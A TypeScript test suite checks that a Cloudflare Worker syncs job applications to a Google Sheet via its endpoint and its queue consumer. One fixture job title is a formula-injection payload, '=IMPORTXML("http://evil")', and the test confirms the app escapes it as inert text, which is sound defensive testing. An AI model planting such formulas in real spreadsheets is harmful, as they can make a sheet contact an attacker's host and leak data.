import { describe, it, expect, beforeAll, beforeEach } from 'vitest';
import { applyD1Migrations, env } from 'cloudflare:test';
import { app } from './index.js';
import type { Bindings } from './env.js';
import { server } from '../fixtures/server.js';
import { googleHandlers } from '../fixtures/google/handlers.js';
import {
  sheetsHandlers,
  currentSheetsStore,
  resetSheetsStore,
} from '../fixtures/sheets/handlers.js';
import { KV_KEYS, encryptRefreshToken, setGoogleAuthHealth } from '@pigeon/shared';

interface TestEnv extends Bindings {
  TEST_MIGRATIONS: Parameters<typeof applyD1Migrations>[1];
}

const workerEnv = env as unknown as TestEnv;

describe('Worker Google Sheets One-Way Sync Workflow', () => {
  beforeAll(async () => {
    await applyD1Migrations(workerEnv.DB, workerEnv.TEST_MIGRATIONS);
    server.use(...googleHandlers, ...sheetsHandlers);

    workerEnv.GOOGLE_CLIENT_ID = 'test-sheets-client-id';
    workerEnv.GOOGLE_CLIENT_SECRET = 'test-sheets-client-secret';
    workerEnv.GOOGLE_TOKEN_ENCRYPTION_KEY = 'test-encryption-key-for-wrangler';
    workerEnv.GOOGLE_SHEET_ID = 'mock-sheet-id-456';

    const nowIso = new Date().toISOString();
    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO profile (id, data, updated_at) VALUES (?, ?, ?)`,
    )
      .bind(
        'default',
        JSON.stringify({
          name: 'Alex Mercer',
          email: 'alex@example.com',
          skills: ['TypeScript'],
          experience: [],
          education: [],
          preferences: { locations: ['Remote'], remote: true },
          filters: { titles: ['Engineer'], locations: ['Remote'], company_blacklist: [] },
          send_settings: {
            daily_cap: 20,
            window: { start: '00:00', end: '23:59' },
            timezone: 'UTC',
            ramp_base: 5,
            ramp_step: 2,
            auto_approve_above_score: 85,
          },
          answers: {
            notice_period: '',
            current_ctc: '',
            expected_ctc: '',
            work_authorisation: '',
            links: {},
            other: {},
          },
        }),
        nowIso,
      )
      .run();
  });

  beforeEach(async () => {
    resetSheetsStore();
    server.use(...googleHandlers, ...sheetsHandlers);

    // Setup valid Google Auth in KV
    const encrypted = await encryptRefreshToken(
      'mock-refresh-token-12345',
      workerEnv.GOOGLE_TOKEN_ENCRYPTION_KEY as string,
    );
    await workerEnv.CONFIG.put(KV_KEYS.REFRESH_TOKEN_ENCRYPTED, encrypted);
    await setGoogleAuthHealth({
      config: workerEnv.CONFIG,
      status: 'ok',
      reason: null,
    });
  });

  it('POST /api/sync/sheet syncs pending applications to Google Sheet, formatting cells and updating synced_at', async () => {
    const nowIso = new Date().toISOString();

    // Insert jobs
    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO jobs (
        id, dedupe_key, source, source_kind, title, company, company_normalized,
        description, fetched_at, status, updated_at, contact_email
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind(
        'job-sheet-1',
        'dedupe-sheet-1',
        'lever',
        'api',
        '=IMPORTXML("http://evil")', // Untrusted title
        'Stripe',
        'stripe',
        'Job description for Stripe',
        nowIso,
        'routed',
        nowIso,
        'recruiter@stripe.com',
      )
      .run();

    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO jobs (
        id, dedupe_key, source, source_kind, title, company, company_normalized,
        description, fetched_at, status, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind(
        'job-sheet-2',
        'dedupe-sheet-2',
        'greenhouse',
        'ats',
        'Staff Infrastructure Engineer',
        'Linear',
        'linear',
        'Job description for Linear',
        nowIso,
        'routed',
        nowIso,
      )
      .run();

    // Insert applications (one email, one manual)
    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO applications (
        id, job_id, kind, channel, status, sent_at, updated_at, synced_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind(
        'app-sheet-1',
        'job-sheet-1',
        'initial',
        'email',
        'sent',
        nowIso,
        nowIso,
        null, // needs sync
      )
      .run();

    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO applications (
        id, job_id, kind, channel, status, applied_at, updated_at, synced_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind(
        'app-sheet-2',
        'job-sheet-2',
        'initial',
        'manual',
        'manual_applied',
        nowIso,
        nowIso,
        null, // needs sync
      )
      .run();

    // Trigger sync endpoint
    const res = await app.fetch(
      new Request('http://localhost/api/sync/sheet', {
        method: 'POST',
      }),
      workerEnv,
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { ok: boolean; syncedCount: number };
    expect(body.ok).toBe(true);
    expect(body.syncedCount).toBe(2);

    // Verify written rows in Mock Sheets Store
    const row2 = currentSheetsStore.values.get('Applications!A2:Q2');
    expect(row2).toBeDefined();
    expect(row2?.[0]?.[0]).toBe('app-sheet-1');
    expect(row2?.[0]?.[3]).toBe('\'=IMPORTXML("http://evil")'); // inert text!
    expect(row2?.[0]?.[5]).toBe('Email'); // Channel=Email

    const row3 = currentSheetsStore.values.get('Applications!A3:Q3');
    expect(row3).toBeDefined();
    expect(row3?.[0]?.[0]).toBe('app-sheet-2');
    expect(row3?.[0]?.[5]).toBe('Manual'); // Channel=Manual
    expect(row3?.[0]?.[8]).toBe('Not listed'); // Missing salary -> Not listed

    // Verify synced_at was updated in D1
    const app1 = await workerEnv.DB.prepare(`SELECT synced_at FROM applications WHERE id = ?`)
      .bind('app-sheet-1')
      .first<{ synced_at: string | null }>();
    expect(app1?.synced_at).toBeTruthy();

    const app2 = await workerEnv.DB.prepare(`SELECT synced_at FROM applications WHERE id = ?`)
      .bind('app-sheet-2')
      .first<{ synced_at: string | null }>();
    expect(app2?.synced_at).toBeTruthy();

    // Running second time makes ZERO sheet updates
    const callsBefore = currentSheetsStore.batchUpdateCalls;
    const res2 = await app.fetch(
      new Request('http://localhost/api/sync/sheet', {
        method: 'POST',
      }),
      workerEnv,
    );
    expect(res2.status).toBe(200);
    const body2 = (await res2.json()) as { ok: boolean; syncedCount: number };
    expect(body2.syncedCount).toBe(0);
    expect(currentSheetsStore.batchUpdateCalls).toBe(callsBefore);
  });

  it('Queue consumer executes sync_sheet task and updates D1', async () => {
    const nowIso = new Date().toISOString();

    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO jobs (
        id, dedupe_key, source, source_kind, title, company, company_normalized,
        description, fetched_at, status, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind(
        'job-sheet-q1',
        'dedupe-sheet-q1',
        'ashby',
        'ats',
        'Reliability Engineer',
        'Cloudflare',
        'cloudflare',
        'Job description for Cloudflare',
        nowIso,
        'routed',
        nowIso,
      )
      .run();

    await workerEnv.DB.prepare(
      `INSERT OR REPLACE INTO applications (
        id, job_id, kind, channel, status, updated_at, synced_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?)`,
    )
      .bind('app-sheet-q1', 'job-sheet-q1', 'initial', 'email', 'approved', nowIso, null)
      .run();

    // Send queue message { action: 'sync_sheet' }
    const batch = {
      messages: [
        {
          id: 'msg-sync-1',
          timestamp: new Date(),
          body: { action: 'sync_sheet' },
          ack: () => {},
          retry: () => {},
        },
      ],
      queue: 'pigeon-jobs',
      ackAll: () => {},
      retryAll: () => {},
    };

    // Trigger queue handler on worker
    const workerModule = (await import('./index.js')).default;
    await workerModule.queue(
      batch as unknown as Parameters<typeof workerModule.queue>[0],
      workerEnv,
    );

    // Verify synced_at was updated in D1
    const appQ = await workerEnv.DB.prepare(`SELECT synced_at FROM applications WHERE id = ?`)
      .bind('app-sheet-q1')
      .first<{ synced_at: string | null }>();
    expect(appQ?.synced_at).toBeTruthy();
  });
});
